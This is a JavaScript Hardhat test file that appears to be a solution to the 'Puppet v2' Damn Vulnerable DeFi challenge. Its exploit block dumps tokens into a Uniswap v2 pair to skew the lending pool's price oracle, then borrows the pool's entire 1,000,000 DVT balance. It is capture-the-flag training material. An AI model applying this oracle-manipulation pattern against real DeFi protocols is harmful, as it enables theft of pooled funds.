const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { parseEther, formatEther } = require("ethers/lib/utils");

describe('[Challenge] Puppet v2', function () {
    let deployer, attacker;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x1158e460913d00000", // 20 ETH
        ]);
        expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther('20'));

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        this.uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        this.uniswapRouter = await UniswapRouterFactory.deploy(
            this.uniswapFactory.address,
            this.weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await this.token.approve(
            this.uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapRouter.addLiquidityETH(
            this.token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        this.uniswapExchange = await UniswapPairFactory.attach(
            await this.uniswapFactory.getPair(this.token.address, this.weth.address)
        );
        expect(await this.uniswapExchange.balanceOf(deployer.address)).to.be.gt('0');

        // Deploy the lending pool
        this.lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            this.weth.address,
            this.token.address,
            this.uniswapExchange.address,
            this.uniswapFactory.address
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('0.3'));
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(ethers.utils.parseEther('300000'));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE 
         * I somehow have to manipulate the price using ETH and DVTs,
         * to make either WETH or ETH worth more than what tokens are worth.
        */

        /** Since the pool is getting the price mainly based on the reserves, the only thing
         * we have access to tamper are the reserves. 
         * We can do this in several ways:
         *  We can try to directly transfer to the exchange
         *  We can try to swap the reserves
         *  We can try to buy/sell reserves
         *  We can add liquidity
         **/


        getBalance = ethers.provider.getBalance
        lp = this.lendingPool.connect(attacker);
        token = this.token.connect(attacker);
        weth = this.weth.connect(attacker);
        uniSwapExchange = this.uniswapExchange.connect(attacker); // pair
        uniSwapRouter = this.uniswapRouter.connect(attacker);
        
        // Check our current status
        let currentTokens = await token.balanceOf(attacker.address); 
        let currentWeth = await weth.balanceOf(attacker.address);
        let currentEth = await getBalance(attacker.address);

        async function info() {
            // Check our current status again. 
            currentTokens = await token.balanceOf(attacker.address); 
            currentWeth = await weth.balanceOf(attacker.address);
            currentEth = await getBalance(attacker.address);
            console.log(`\n## INFO ##`)
            console.log(`# Your current balance is: ${formatEther(currentTokens)} DVT, ${formatEther(currentWeth)} WETH and ${formatEther(currentEth)} ETH`);

            [_reserve0, _reserve1, _blockTimestampLast] = await uniSwapExchange.getReserves();
            console.log(`# reserve0 (DVT): ${formatEther(_reserve0)}, reserve1 (WETH): ${formatEther(_reserve1)}, blockTimeStamp: ${_blockTimestampLast}`);

            wethNeeded = await lp.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
            console.log(`# The current amount of WETH needed to steal 1kk DVTs is: ${formatEther(wethNeeded)}`);
            console.log(`**********************************************************`)
        }

        async function deadline() {
            return (await ethers.provider.getBlock('latest')).timestamp * 2
        }

        await info();

        // Let's swap our ETH for WETH.
        await weth.deposit({value: parseEther("19.8")});

        await token.approve(uniSwapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await weth.approve(uniSwapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);

        // function swapExactTokensForTokens(
        //     uint amountIn,
        //     uint amountOutMin,
        //     address[] calldata path,
        //     address to,
        //     uint deadline
        //   ) external returns (uint[] memory amounts);

        // Let's swap them. Since we have more of the asset that can change drastically the value, start with this.
        await uniSwapRouter.swapExactTokensForTokens(ATTACKER_INITIAL_TOKEN_BALANCE, 0, [token.address, weth.address], attacker.address, deadline());

        await info();

        await weth.approve(lp.address, wethNeeded);
        await lp.borrow(POOL_INITIAL_TOKEN_BALANCE);

        await info();

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});